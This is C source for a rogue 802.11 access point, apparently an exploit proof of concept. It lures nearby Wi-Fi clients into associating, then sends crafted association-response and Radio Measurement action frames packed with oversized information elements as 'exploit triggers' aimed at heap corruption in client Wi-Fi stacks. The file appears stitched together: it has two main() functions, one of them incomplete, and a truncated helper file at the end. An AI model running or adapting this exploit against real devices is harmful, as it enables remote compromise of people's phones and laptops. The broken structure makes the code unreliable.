state_t g_state = S_AWAITING_PROBE_REQ;


struct ieee80211_radiotap_header {
	u_int8_t it_version;      /* set to 0 */
	u_int8_t it_pad;
	u_int16_t it_len;         /* entire length */
	u_int32_t it_present;     /* fields present */
} __attribute__((__packed__));
typedef struct ieee80211_radiotap_header radiotap_t;

struct ieee80211_frame_header {
	u_int version:2;
	u_int type:2;
	u_int subtype:4;
	u_int8_t ctrlflags;
	u_int16_t duration;
	u_int8_t dst_mac[ETH_ALEN];
	u_int8_t src_mac[ETH_ALEN];
	u_int8_t bssid[ETH_ALEN];
	u_int frag:4;
	u_int seq:12;
} __attribute__((__packed__));
typedef struct ieee80211_frame_header dot11_frame_t;

struct ieee80211_beacon {
	u_int64_t timestamp;
	u_int16_t interval;
	u_int16_t caps;
} __attribute__((__packed__));
typedef struct ieee80211_beacon beacon_t;

struct ieee80211_information_element {
	u_int8_t id;
	u_int8_t len;
	u_int8_t data[0];
} __attribute__((__packed__));
typedef struct ieee80211_information_element ie_t;

struct ieee80211_authentication {
	u_int16_t algorithm;
	u_int16_t seq;
	u_int16_t status;
} __attribute__((__packed__));
typedef struct ieee80211_authentication auth_t;

struct ieee80211_assoc_request {
	u_int16_t caps;
	u_int16_t interval;
} __attribute__((__packed__));
typedef struct ieee80211_assoc_request assoc_req_t;

struct ieee80211_assoc_response {
	u_int16_t caps;
	u_int16_t status;
	u_int16_t id;
} __attribute__((__packed__));
typedef struct ieee80211_assoc_response assoc_resp_t;


struct ieee80211_action {
	u_int8_t category;
	u_int8_t action;
	u_int8_t dialog;
	u_int16_t repetitions;
} __attribute__((__packed__));
typedef struct ieee80211_action action_t;


void timespec_diff(struct timespec *newer, struct timespec *older, struct timespec *diff);

char *mac_string(u_int8_t *mac);
void hexdump(const u_char *ptr, u_int len);
char *ssid_string(ie_t *ie);

ie_t *get_ssid_ie(const u_int8_t *data, u_int32_t left);
u_int16_t get_sequence(void);

int start_pcap(pcap_t **pcap);
int open_raw_socket(void);
int set_channel(void);

int handle_packet(const u_char *data, u_int32_t left);
int process_periodic_tasks(void);

int process_radiotap(const u_char **ppkt, u_int32_t *pleft);
dot11_frame_t *get_dot11_frame(const u_char **ppkt, u_int32_t *pleft);
int process_probe_request(dot11_frame_t *d11, const u_char *data, u_int32_t left);
int process_auth_request(dot11_frame_t *d11, const u_char *data, u_int32_t left);
int process_assoc_request(dot11_frame_t *d11, const u_char *data, u_int32_t left);

int send_beacon();
int send_probe_response(u_int8_t *dst_mac);
int send_auth_response(u_int8_t *dst_mac);
int send_assoc_response(u_int8_t *dst_mac);
int send_exploit_trigger(u_int8_t *dst_mac);


void usage(char *argv0)
{
	fprintf(stderr, "usage: %s [options] <ssid>\n", argv0);
	fprintf(stderr, "\nsupported options:\n\n"
			"-b             send beacons regularly (default: off)\n"
			"-c <channel>   use the specified channel (default: %d)\n"
			"-i <interface> interface to use for monitoring/injection (default: %s)\n"
			"-m <mac addr>  use the specified mac address (default: from phys)\n"
			, DEFAULT_CHANNEL, g_iface);
}



static int send_exploit_heap_trigger(dot11_frame_t *_d11, const u_char *data, u_int32_t left)
{

	u_int8_t *p = g_pkt;
	dot11_frame_t *d11;
	assoc_resp_t *assoc;
	int i;



	g_state = S_SENT_ASSOC_RESP;
	fill_radiotap(&p);
	d11 = (dot11_frame_t *)p;
	fill_dot11(&p, T_MGMT, ST_ASSOC_RESP, _d11->src_mac);

	/* add the assoc info */
	assoc = (assoc_resp_t *)p;
	assoc->caps = 1;
	assoc->status = 0; // successful
	assoc->id = 1;
	p = (u_int8_t *)(assoc + 1);

	fill_ie(&p, IEID_RATES, (u_int8_t *)"\x0c\x12\x18\x24\x30\x48\x60\x6c", 8);
	for (i = 0; i < 16; i++)
		fill_ie(&p, IEID_RIC_DATADESC, (u_int8_t*) "\x41\x41\x41\x41", 4);


	g_pkt_len = p - g_pkt;
	if (!send_packet(d11))
		return 0;

}

/*
 * The main function of this program simply checks prelimary arguments and
 * and launches the attack.
 */
int main(int argc, char *argv[])
{
	char *argv0;
	int ret = 0, c;
	pcap_t *pch = NULL;
	struct pcap_pkthdr *pchdr = NULL;
	const u_char *inbuf = NULL;
	int pcret;

	/* initalize stuff */
	srand(getpid());
	strcpy(g_iface, "mon0");

	argv0 = "jfap";
	if (argv && argc > 0 && argv[0])
		argv0 = argv[0];

	if (argc < 2) {
		usage(argv0);
		return 1;
	}

	while ((c = getopt(argc, argv, "bc:i:m:")) != -1) {
		switch (c) {
			case '?':
			case 'h':
				usage(argv0);
				return 1;

			case 'b':
				g_send_beacons = 1;
				break;

			case 'c':
				{
					int tmp = atoi(optarg);
					if (tmp < 1 || tmp > 12) {
						fprintf(stderr, "[!] invalid channel: %s\n", optarg);
						return 1;
					}

					g_channel = tmp;
				}
				break;

			case 'i':
				strncpy(g_iface, optarg, sizeof(g_iface) - 1);
				break;

			case 'm':
				{
					struct ether_addr *pe;

					pe = ether_aton(optarg);
					if (!pe) {
						fprintf(stderr, "[!] invalid mac address: %s\n", optarg);
						return 1;
					}
					memcpy(g_bssid, pe->ether_addr_octet, ETH_ALEN);
				}
				break;

			default:
				fprintf(stderr, "[!] invalid option '%c'! try -h ...\n", c);
				return 1;
				/* not reached */
				break;
		}
	}

	/* adjust params */
	argc -= optind;
	argv += optind;

	/* process required arguments */
	if (argc < 1) {
		usage(argv0);
		return 1;
	}

	strncpy((char *)g_ssid, argv[0], sizeof(g_ssid) - 1);
	g_ssid_len = strlen((char *)g_ssid);

	printf("[*] Starting access point with SSID \"%s\" via interface \"%s\"\n",
			g_ssid, g_iface);

	if (!start_pcap(&pch))
		return 1;

	if ((g_sock = open_raw_socket()) == -1)
		return 1;

	/* set the channel for the wireless card */
	if (!set_channel())
		return 1;

	while (1) {
		pcret = pcap_next_ex(pch, &pchdr, &inbuf);
		if (pcret == -1) {
			pcap_perror(pch, "[!] Failed to get a packet");
			continue;
		}

		/* if we got a packet, process it */
		if (pcret == 1) {
			/* check the length against the capture length */
			if (pchdr->len > pchdr->caplen)
				fprintf(stderr, "[-] WARNING: truncated frame! (len: %lu > caplen: %lu)\n",
						(ulong)pchdr->len, (ulong)pchdr->caplen);

			if (!handle_packet(inbuf, pchdr->caplen)) {
				ret = 1;
				break;
			}
		}

		if (!process_periodic_tasks()) {
			ret = 1;
			break;
		}
	}

	pcap_close(pch);
	return ret;
}


/*
 * handle a single packet from the wifi nic
 */
int handle_packet(const u_char *data, u_int32_t left)
{
	dot11_frame_t *d11;

	if (!process_radiotap(&data, &left))
		return 1; /* treat errors as warnings */

	if (!(d11 = get_dot11_frame(&data, &left)))
		return 1; /* treat errors as warnings */

	/* ignore anything from us */
	if (!memcmp(d11->src_mac, g_bssid, ETH_ALEN))
		return 1; /* finished with this packet */

	/* handle retransmissions */
	if (d11->ctrlflags & CF_RETRY) {
		/* if we have a packet that we tried to send, re-send it now */
		if (g_pkt_len > 0) {
			/* don't retransmit too fast */
			struct timespec now, diff;

			if (clock_gettime(CLOCK_REALTIME, &now)) {
				perror("[!] gettimeofday failed");
				return 0;
			}

			/* see how long since the last retransmit. if it's been
			 * long enough, send again */
			timespec_diff(&now, &last_retransmit, &diff);

			if (diff.tv_sec > 0 || diff.tv_nsec > BEACON_INTERVAL * 100000) {
#ifdef DEBUG_RETRANSMIT
				printf("[*] Re-transmitting...\n");
#endif
				if (send(g_sock, g_pkt, g_pkt_len, 0) == -1) {
					perror("[!] Unable to re-send packet!");
					/* just try again later */
				}
				last_retransmit = now;
			}
		}

		/* don't process retransmission packets further */
		return 1;
	}

	/* handle broadcast packets - only probe requests */
	if (d11->type == T_MGMT && d11->subtype == ST_PROBE_REQ) {
		if (!process_probe_request(d11, data, left))
			return 1; /* finished with this packet */
		return 1; /* finished with this packet */
	}

	/* from here on out, we only handle unicast packets */
	if (memcmp(d11->dst_mac, g_bssid, ETH_ALEN)) {
#ifdef DEBUG_IGNORED
		printf("[*] Ingoring 802.11 packet ver:%u type:%s subtype:%s\n",
				d11->version, dot11_types[d11->type],
				dot11_subtypes[d11->type][d11->subtype]);
		hexdump(data, left);
#endif
		return 1; /* finished with this packet */
	}

	if (d11->type == T_MGMT) {
		if (d11->subtype == ST_AUTH)
			return process_auth_request(d11, data, left);

		else if (d11->subtype == ST_ASSOC_REQ)
		  return send_exploit_heap_trigger(d11, data, left);
		  //return process_assoc_request(d11, data, left);

	} /* type check */

	else if (d11->type == T_DATA) {
		g_state = S_ESTABLISHED;
		g_pkt_len = 0;
#ifndef DEBUG_DATA
		printf("[*] Station successfully associated and is sending data...\n");
#else
		printf("[*] Unhandled 802.11 packet ver:%u type:%s subtype:%s%s\n",
				d11->version, dot11_types[d11->type],
				dot11_subtypes[d11->type][d11->subtype],
				(d11->subtype >> 3) ? " (QoS)" : "");
		hexdump(data, left);
#endif

		if (g_state != S_EXPLOIT_SENT) {
			g_state = S_EXPLOIT_SENT;
			if (!send_exploit_trigger(d11->src_mac))
				return 0;
		}

		return 1;
	}

	/* if we didn't handle this packet somehow, we should display it */
#ifdef DEBUG_DOT11
	printf("[*] Unhandled 802.11 packet ver:%u type:%s subtype:%s\n",
			d11->version, dot11_types[d11->type],
			dot11_subtypes[d11->type][d11->subtype]);
	hexdump(data, left);
#endif

	return 1;
}


/*
 * handle periodic tasks that need to be done
 */
int process_periodic_tasks(void)
{
	if (g_send_beacons) {
		/* we didn't get a pcket yet, do periodic processing */
		struct timespec now, diff;

		if (clock_gettime(CLOCK_REALTIME, &now)) {
			perror("[!] clock_gettime failed");
			return 0;
		}

		/* see how long since the last beacon. if it's been long enough,
		 * send another */
		timespec_diff(&now, &last_beacon, &diff);
		if (diff.tv_sec > 0 || diff.tv_nsec > BEACON_INTERVAL * 1000000) {
#ifdef DEBUG_BEACON_INTERVAL
			printf("%lu.%lu - %lu.%lu = %lu.%lu (vs %lu)\n",
					(ulong)now.tv_sec, now.tv_nsec,
					(ulong)last_beacon.tv_sec, last_beacon.tv_nsec,
					(ulong)diff.tv_sec, diff.tv_nsec,
					(ulong)BEACON_INTERVAL * 1000000);
#endif
			if (!send_beacon())
				return 1; /* treat error as warning */
			last_beacon = now;
		}
	} /* if (g_send_beacons) */

	return 1;
}


/*
 * try to start capturing packets from the specified interface (a wireless card
 * in monitor mode)
 *
 * on succes, we return 1, on failure, 0
 */
int start_pcap(pcap_t **pcap)
{
	char errorstr[PCAP_ERRBUF_SIZE];
	int datalink;

	printf("[*] Starting capture on \"%s\" ...\n", g_iface);

	*pcap = pcap_open_live(g_iface, SNAPLEN, 8, 25, errorstr);
	if (*pcap == (pcap_t *)NULL) {
		fprintf(stderr, "[!] pcap_open_live() failed: %s\n", errorstr);
		return 0;
	}

	datalink = pcap_datalink(*pcap);
	switch (datalink) {
		case DLT_IEEE802_11_RADIO:
			break;

		default:
			fprintf(stderr, "[!] Unknown datalink for interface \"%s\": %d\n",
					g_iface, datalink);
			fprintf(stderr, "    Only RADIOTAP is currently supported.\n");
			return 0;
	}

	return 1;
}



/*
 * open a raw socket that we can use to send raw 802.11 frames
 */
int open_raw_socket(void)
{
	int sock;
	struct sockaddr_ll la;
	struct ifreq ifr;

	sock = socket(PF_PACKET, SOCK_RAW, ETH_P_ALL);
	if (sock == -1) {
		perror("[!] Unable to open raw socket");
		return -1;
	}

	/* build the link-level address struct for binding */
	memset(&la, 0, sizeof(la));
	la.sll_family = AF_PACKET;
	la.sll_halen = ETH_ALEN;

	/* get the interface index */
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, g_iface, IFNAMSIZ);
	if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
		perror("[!] Unable to get interface index");
		close(sock);
		return -1;
	}
#ifdef DEBUG_IF_INDEX
	printf("[*] Interface index: %u\n", ifr.ifr_ifindex);
#endif
	la.sll_ifindex = ifr.ifr_ifindex;

	if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
		perror("[!] Unable to get hardware address");
		close(sock);
		return -1;
	}
#ifdef DEBUG_IF_HWADDR
	printf("[*] Interface hardware address: %s\n", mac_string((u_int8_t *)ifr.ifr_hwaddr.sa_data));
#endif
	if (!memcmp(g_bssid, "\x00\x00\x00\x00\x00\x00", ETH_ALEN))
		memcpy(g_bssid, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	 memcpy(la.sll_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

	 /* verify the interface uses RADIOTAP */
	 if (ifr.ifr_hwaddr.sa_family != ARPHRD_IEEE80211_RADIOTAP) {
		 fprintf(stderr, "[!] bad address family: %u\n", ifr.ifr_hwaddr.sa_family);
		 close(sock);
		 return -1;
	 }

	 /* bind this socket to the interface */
	 if (bind(sock, (struct sockaddr *)&la, sizeof(la)) == -1) {
		perror("[!] Unable to bind to interface");
		close(sock);
		return -1;
	}
	return sock;
}


/*
 * set the channel of the wireless card
 */
int set_channel(void)
{
	char cmd[256] = { 0 };

	snprintf(cmd, sizeof(cmd) - 1, "iwconfig %s channel %d", g_iface, g_channel);
	if (system(cmd))
		return 0;
	return 1;
}


/*
 * process the radiotap header
 */
int process_radiotap(const u_char **ppkt, u_int32_t *pleft)
{
	const u_char *p = *ppkt;
	radiotap_t *prt = (radiotap_t *)p;
#ifdef DEBUG_RADIOTAP_PRESENT
	int idx = 0;
	u_int32_t *pu = &prt->it_present;
#endif

	if (*pleft < sizeof(radiotap_t)) {
		fprintf(stderr, "[!] Packet doesn't have enough data for a radiotap header?!\n");
		return 0;
	}

#ifdef DEBUG_RADIOTAP
	printf("[*] got RADIOTAP packet - ver:%u pad:%u len:%u\n",
			prt->it_version, prt->it_pad, prt->it_len);
#endif
	if (*pleft <= prt->it_len) {
		fprintf(stderr, "[!] Packet is too small to contain the radiotap header and data\n");
		return 0;
	}

#ifdef DEBUG_RADIOTAP_PRESENT
	printf("    present[%u]: 0x%lx\n", idx, (ulong)prt->it_present);
	while (prt->it_present & 0x1) {
		++idx;
		printf("    present[%u]: 0x%lx\n", idx, (ulong)pu[idx]);
	}
#endif

	*ppkt = p + prt->it_len;
	*pleft -= prt->it_len;

	return 1;
}


/*
 * process the 802.11 frame
 */
dot11_frame_t *get_dot11_frame(const u_char **ppkt, u_int32_t *pleft)
{
	const u_char *p = *ppkt;

	if (*pleft < sizeof(dot11_frame_t)) {
#ifdef DEBUG_DOT11_SHORT_PKTS
		fprintf(stderr, "[-] Not enough data for 802.11 frame header (bytes left: %u)!\n", *pleft);
		hexdump(p, *pleft);
#endif
		return NULL;
	}

	*ppkt = p + sizeof(dot11_frame_t);
	*pleft -= sizeof(dot11_frame_t);

	return (dot11_frame_t *)p;
}


/*
 * process an 802.11 probe request
 */
int process_probe_request(dot11_frame_t *d11, const u_char *data, u_int32_t left)
{
	ie_t *ie;
	char ssid_req[32] = { 0 };

	if (!(ie = get_ssid_ie(data, left))) {
		fprintf(stderr, "[-] Probe request with no SSID encountered!\n");
		return 1; /* just a warning */
	}

	/* the ssid might be empty, or might be too long */
	if (ie->len > 0)
		strcpy(ssid_req, ssid_string(ie));

	/* there are broadcast and unicast probe requests... */
	if (!memcmp(d11->dst_mac, g_bssid, ETH_ALEN)) {
		/* for us!? */
#ifndef DONT_CHECK_SSID_ON_UNICAST
		if (!strcmp(ssid_req, (char *)g_ssid)) {
			printf("[*] (%s) Probe request for our BSSID and SSID, replying...\n", mac_string(d11->src_mac));
			g_state = S_SENT_PROBE_RESP;
			if (!send_probe_response(d11->src_mac))
				return 1; /* treat send errors as a warning */
		}
#else
		printf("[*] (%s) Probe request for our BSSID, replying...\n", mac_string(d11->src_mac));
		g_state = S_SENT_PROBE_RESP;
		if (!send_probe_response(d11->src_mac))
			return 1; /* treat send errors as a warning */
#endif
	} else if (!memcmp(d11->dst_mac, IEEE80211_BROADCAST_ADDR, ETH_ALEN)) {
		/* broadcast probe request - discovery? */
		/* NOTE: this is the active-scan equivalent of a beacon -- no state change here */
		if (ie && ie->len > 0) {
			/* we must check the SSID on broadcast probes */
			if (!strcmp(ssid_req, (char *)g_ssid)) {
				printf("[*] (%s) Broadcast probe request for our SSID \"%s\" received, replying...\n", mac_string(d11->src_mac), ssid_req);
				if (!send_probe_response(d11->src_mac))
					return 1; /* treat send errors as a warning */
			} else {
				printf("[*] (%s) Broadcast probe request for \"%s\" received, NOT replying...\n", mac_string(d11->src_mac), ssid_req);
			}
		} else {
			printf("[*] (%s) Broadcast probe request received, replying...\n", mac_string(d11->src_mac));
			if (!send_probe_response(d11->src_mac))
				return 1; /* treat send errors as a warning */
		}
	} /* mac check */
	else {
		if (ie->len > 0) {
			printf("[*] (%s) Unhandled probe request for SSID (%u bytes): \"%s\"\n", mac_string(d11->src_mac), ie->len, ssid_req);
		} else {
			printf("[*] (%s) Unhandled probe request for empty SSID\n", mac_string(d11->src_mac));
		}
	}
	return 1;
}


/*
 * process an 802.11 authentication request
 */
int process_auth_request(dot11_frame_t *d11, const u_char *data, u_int32_t left)
{
	auth_t *auth;

	if (left < sizeof(auth_t)) {
		fprintf(stderr, "[-] (%s) Auth request without parameters!\n", mac_string(d11->src_mac));
		return 1;
	}

	auth = (auth_t *)data;
	if (auth->seq != 1) {
		fprintf(stderr, "[-] Authentication sequence is not 0x0001 !!\n");
	}

	printf("[*] (%s) Auth request received (alg:0x%x, seq:%u, status:%u), replying...\n",
			mac_string(d11->src_mac),
			auth->algorithm, auth->seq, auth->status);

	g_state = S_SENT_AUTH;
	if (!send_auth_response(d11->src_mac))
		return 1; /* treat send errors as a warning */

	return 1;
}

/*
 * process an 802.11 association request destined for us
 */
int process_assoc_request(dot11_frame_t *d11, const u_char *data, u_int32_t left)
{
	assoc_req_t *assoc;
	ie_t *ie;

	if (left < sizeof(assoc_req_t)) {
		fprintf(stderr, "[-] (%s) Association request without parameters!\n", mac_string(d11->src_mac));
		return 1;
	}
	assoc = (assoc_req_t *)data;

	data += sizeof(assoc_req_t);
	left -= sizeof(assoc_req_t);

	if (!(ie = get_ssid_ie(data, left))) {
		printf("[*] (%s) Association request without SSID received (caps:0x%x, interval: %u), replying...\n",
				mac_string(d11->src_mac),
				assoc->caps, assoc->interval);
	} else {
		printf("[*] (%s) Association request for \"%s\" received (caps:0x%x, interval: %u), replying...\n",
				mac_string(d11->src_mac),
				ssid_string(ie),
				assoc->caps, assoc->interval);
	}

	g_state = S_SENT_ASSOC_RESP;
	if (!send_assoc_response(d11->src_mac))
		return 1; /* treat send errors as a warning */
	return 1;
}


/*
 * send an 802.11 packet with a bunch of re-transmissions for the fuck of it
 */
int send_packet(dot11_frame_t *d11)
{
	if (send(g_sock, g_pkt, g_pkt_len, 0) == -1) {
		perror("[!] Unable to send packet!");
		return 0;
	}

	/* set the retransmit flag on the 802.11 header */
	d11->ctrlflags |= CF_RETRY;

	return 1;
}


/*
 * fill the radio tap header in for a packet
 */
void fill_radiotap(u_int8_t **ppkt)
{
	u_int8_t *p = *ppkt;
	radiotap_t *prt = (radiotap_t *)p;

	/* fill out the radio tap header */
	prt->it_version = 0;
	prt->it_len = sizeof(*prt) + 1;
	prt->it_present = (1 << IEEE80211_RADIOTAP_RATE);

	p += sizeof(radiotap_t);

	/* add the data rate (data of the radiotap header) */
	*p++ = 0x4;  // 2Mb/s

	*ppkt = p;
}


/*
 * fill the 802.11 frame header
 */
void fill_dot11(u_int8_t **ppkt, u_int8_t type, u_int8_t subtype, u_int8_t *dst_mac)
{
	dot11_frame_t *d11 = (dot11_frame_t *)(*ppkt);

	/* add the 802.11 header */
	d11->version = 0;
	d11->type = type;
	d11->subtype = subtype;
	d11->ctrlflags = 0;
	d11->duration = 0;
	memcpy(d11->dst_mac, dst_mac, ETH_ALEN);
	memcpy(d11->src_mac, g_bssid, ETH_ALEN);
	memcpy(d11->bssid, g_bssid, ETH_ALEN);
	d11->seq = get_sequence();
	d11->frag = 0;

	*ppkt += sizeof(dot11_frame_t);
}


/*
 * fill in an information element
 */
void fill_ie(u_int8_t **ppkt, u_int8_t id, u_int8_t *data, u_int8_t len)
{
	u_int8_t *p = *ppkt;
	ie_t *ie = (ie_t *)p;

	/* add the ssid IE */
	ie->id = id;
	ie->len = len;

	p = (u_int8_t *)(ie + 1);
	memcpy(p, data, len);

	p += len;
	*ppkt = p;
}


/*
 * send a beacon frame to announce our network
 */
int send_beacon()
{
	u_int8_t pkt[4096] = { 0 }, *p = pkt;
	beacon_t *bc;

	fill_radiotap(&p);
	fill_dot11(&p, T_MGMT, ST_BEACON, IEEE80211_BROADCAST_ADDR);

	/* add the beacon info */
	bc = (beacon_t *)p;
	bc->timestamp = 0;
	bc->interval = BEACON_INTERVAL;
	bc->caps = 1; // we are an AP ;-)
	p = (u_int8_t *)(bc + 1);

	fill_ie(&p, IEID_SSID, g_ssid, g_ssid_len);
	fill_ie(&p, IEID_RATES, (u_int8_t *)"\x0c\x12\x18\x24\x30\x48\x60\x6c", 8);
	fill_ie(&p, IEID_DSPARAMS, &g_channel, 1);

	/* don't retransmit beacons */
	if (send(g_sock, pkt, p - pkt, 0) == -1) {
		perror("[!] Unable to send beacon!");
		return 0;
	}

	//printf("[*] Sent beacon!\n");
	return 1;
}


/*
 * send a probe response to the specified sender
 */
int send_probe_response(u_int8_t *dst_mac)
{
	u_int8_t *p = g_pkt;
	dot11_frame_t *d11;
	beacon_t *bc;

	fill_radiotap(&p);
	d11 = (dot11_frame_t *)p;
	fill_dot11(&p, T_MGMT, ST_PROBE_RESP, dst_mac);

	/* add the beacon info */
	bc = (beacon_t *)p;
	bc->timestamp = 0;
	bc->interval = BEACON_INTERVAL;
	bc->caps = 1; // we are an AP ;-)
	p = (u_int8_t *)(bc + 1);

	fill_ie(&p, IEID_SSID, g_ssid, g_ssid_len);
	fill_ie(&p, IEID_RATES, (u_int8_t *)"\x0c\x12\x18\x24\x30\x48\x60\x6c", 8);
	fill_ie(&p, IEID_DSPARAMS, &g_channel, 1);

	g_pkt_len = p - g_pkt;
	if (!send_packet(d11))
		return 0;

	//printf("[*] Sent probe response to %s!\n", mac_string(dst_mac));
	return 1;
}


/*
 * send an authentication response
 */
int send_auth_response(u_int8_t *dst_mac)
{
	u_int8_t *p = g_pkt;
	dot11_frame_t *d11;
	auth_t *auth;

	fill_radiotap(&p);
	d11 = (dot11_frame_t *)p;
	fill_dot11(&p, T_MGMT, ST_AUTH, dst_mac);

	/* add the auth info */
	auth = (auth_t *)p;
	auth->algorithm = 0; // AUTH_OPEN;
	auth->seq = 2; // should be responding to auth seq 1
	auth->status = 0; // successful
	p = (u_int8_t *)(auth + 1);

	g_pkt_len = p - g_pkt;
	if (!send_packet(d11))
		return 0;

	//printf("[*] Sent auth response to %s!\n", mac_string(dst_mac));
	return 1;
}


/*
 * send an association response
 */
int send_assoc_response(u_int8_t *dst_mac)
{
	u_int8_t *p = g_pkt;
	dot11_frame_t *d11;
	assoc_resp_t *assoc;

	fill_radiotap(&p);
	d11 = (dot11_frame_t *)p;
	fill_dot11(&p, T_MGMT, ST_ASSOC_RESP, dst_mac);

	/* add the assoc info */
	assoc = (assoc_resp_t *)p;
	assoc->caps = 1;
	assoc->status = 0; // successful
	assoc->id = 1;
	p = (u_int8_t *)(assoc + 1);

	fill_ie(&p, IEID_RATES, (u_int8_t *)"\x0c\x12\x18\x24\x30\x48\x60\x6c", 8);

	g_pkt_len = p - g_pkt;
	if (!send_packet(d11))
		return 0;

	//printf("[*] Sent association response to %s!\n", mac_string(dst_mac));
	return 1;
}




/*
 * send an action frame containing a trigger for the exploit
 */
int send_exploit_trigger(u_int8_t *dst_mac)
{
	u_int8_t *p = g_pkt;
	action_t *action;
	int i;
	u_int8_t measure_data[] = {
		0xff, 0xff, 0x05, 0xAA, 0xAA, 0xAA, 0xAA, 0x00,
		0x00, 0xAA, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, /* 16 */
		0x33, 0x32, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 32 */
		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 48 */
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 64 */
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0x33, 0x32, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 80 */
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 96 */
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, /* 112 */
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	   	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA  /* 128 */
	};

	fill_radiotap(&p);
	fill_dot11(&p, T_MGMT, ST_ACTION, dst_mac);

	action = (action_t *)p;
	action->category = 0x05; // Radio Measurement
	action->action = 0x00; // action: Radio Measurement request
	action->dialog = 0x0f; // ??
	action->repetitions = 0; // ??
	p = (u_int8_t *)(action + 1);

	for (i = 0; i < 7; i++) {
		fill_ie(&p, 38, measure_data, sizeof(measure_data));
	}

	g_pkt_len = p - g_pkt;
	if (send(g_sock, g_pkt, g_pkt_len, 0) == -1)
		return 0;

	printf("[*] Sent action frame to %s!\n", mac_string(dst_mac));
	return 1;
}


/*
 * process the information elements looking for an SSID
 */
ie_t *get_ssid_ie(const u_int8_t *data, u_int32_t left)
{
	ie_t *ie;
	const u_int8_t *p = data;
	u_int32_t rem = left;

#ifdef DEBUG_GET_SSID_IE
	printf("[*] processing information element data:\n");
	hexdump(data, left);
#endif

	while (rem > 0) {
		/* see if we have enough for the IE header */
		if (rem < sizeof(*ie)) {
			fprintf(stderr, "[-] Not enough data for an IE!\n");
			return NULL;
		}

		ie = (ie_t *)p;

		/* advance... */
		p += sizeof(*ie);
		rem -= sizeof(*ie);

		/* now, is it an SSID ? */
		if (ie->id == IEID_SSID) {
			return ie;
		}

		/* check if we have all the data */
		if (rem < ie->len) {
			fprintf(stderr, "[-] Not enough data for the IE's data!\n");
			return NULL;
		}

		/* advance past the ie->data */
		p += ie->len;
		rem -= ie->len;
	}

#ifdef DEBUG_GET_SSID_IE
	fprintf(stderr, "[-] SSID IE not found!\n");
#endif
	return NULL;
}


/*
 * create the ascii representation of the specified mac address
 */
char *mac_string(u_int8_t *mac)
{
	static char mac_str[32];
	char *p = mac_str;
	int i;

	for (i = 0; i < ETH_ALEN; i++) {
		u_int8_t hi = mac[i] >> 4;
		u_int8_t lo = mac[i] & 0xf;

		if (hi > 9)
			*p++ = hi - 10 + 'a';
		else
			*p++ = hi + '0';
		if (lo > 9)
			*p++ = lo - 10 + 'a';
		else
			*p++ = lo + '0';
		if (i < ETH_ALEN - 1)
			*p++ = ':';
	}
	*p = '\0';

	return mac_str;
}


/*
 * return the ssid string, ensuring truncation and nul termination
 */
char *ssid_string(ie_t *ie)
{
	static char ssid_str[32];

	if (ie->len > sizeof(ssid_str) - 1)
		strncpy(ssid_str, (char *)ie->data, sizeof(ssid_str) - 1);
	else
		strncpy(ssid_str, (char *)ie->data, ie->len);
	return ssid_str;
}


/*
 * handle sequence number generation
 */
u_int16_t get_sequence(void)
{
	static u_int16_t sequence = 1337;
	uint16_t ret = sequence;

	sequence++;
	if (sequence > 4095)
		sequence = 0;
	return ret;
}


/*
 * diff two timespec values
 */
void timespec_diff(struct timespec *newer, struct timespec *older, struct timespec *diff)
{
	diff->tv_sec = newer->tv_sec - older->tv_sec;
	diff->tv_nsec = newer->tv_nsec - older->tv_nsec;
	if (diff->tv_nsec < 0) {
		--diff->tv_sec;
		diff->tv_nsec += 1000000000;
	}
}


int main(int argc, char **argv)
{
	pcap_t *pch = NULL;
	struct pcap_pkthdr *pchdr = NULL;
	const u_char *inbuf = NULL;
	const char *iface;
	const char *ssid;

	if (argc < 3) {
		printf("Usage, ./%s interface ssid\n", argv[0]);
		return EXIT_FAILURE;
	}

	if (!start_pcap(&pch))
		return EXIT_FAILURE;

	g_sock = open_raw_socket();
	if (g_sock == -1)
		return EXIT_FAILURE;

	
}

```

`wifi/build-example`:

```
gcc -O3 -Wall -Wextra -ggdb -o CVE.c hexdump.c -lpcap -lrt -DDEBUG_DOT11 -DDEBUG_RETRANSMIT

```

`wifi/hexdump.c`:

```c
/*
 * Copyright (C) 2004 Joshua J. Drake <hexdump@qoop.org>
 *
 * DISCLAIMER:
 * This code is strictly for educational purposes only.
 * That means that it is *ABSOLUTELY* not to be used maliciously.
 *
 * Any duplication or proliferation of this code is
 * expressly prohibited and punishable by law.
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <sys/types.h>


#define BYTES_IN_MINOR_GROUP 	4
#define MINOR_GROUPS_IN_MAJOR 	2
#define MAJOR_GROUPS_PER_LINE 	2


#ifndef OUT_FILEP
# define OUT_FILEP 	stdout
#endif


void hexdump(u_char *ptr, u_int len)
{
	u_char *line, *line_p;
	u_char *hex_p, *asc_p;
	u_int line_len = 0;
	u_int min_cnt = 0;
	u_int maj_cnt = 0;
	u_int byte_cnt = 0;

	/* can't dump 0 bytes! */
	if (!len)
		return;

	/* allocate enuff memory for our output */
